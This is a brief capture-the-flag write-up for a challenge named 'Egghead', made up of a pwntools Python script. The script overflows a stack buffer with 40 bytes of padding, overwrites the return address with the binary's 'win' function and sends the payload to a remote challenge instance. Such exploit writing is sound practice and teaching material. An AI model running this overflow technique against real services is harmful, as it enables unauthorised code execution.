#### Egghead
- points earned: 172

#### Solution
```python
from pwn import *


elf = ELF('./egghead')
win = elf.sym['win']
print(f'{hex(win)=}')

gdbscript = '\n'.join([
    'b *name+141'
])
# p = gdb.debug('./egghead', gdbscript=gdbscript)
p = remote('egghead-f0fe344604d9ae1a.instancer.batmans.kitchen', 1337, ssl=True)

p.recvuntil(b'> ')

offset = 32 + 8
pad = b'A'*offset
ret = win # 0xaabbccdd
payload = pad + p64(ret)
p.sendline(payload)

p.sendline(b'Happy Gilmore')
p.interactive()
```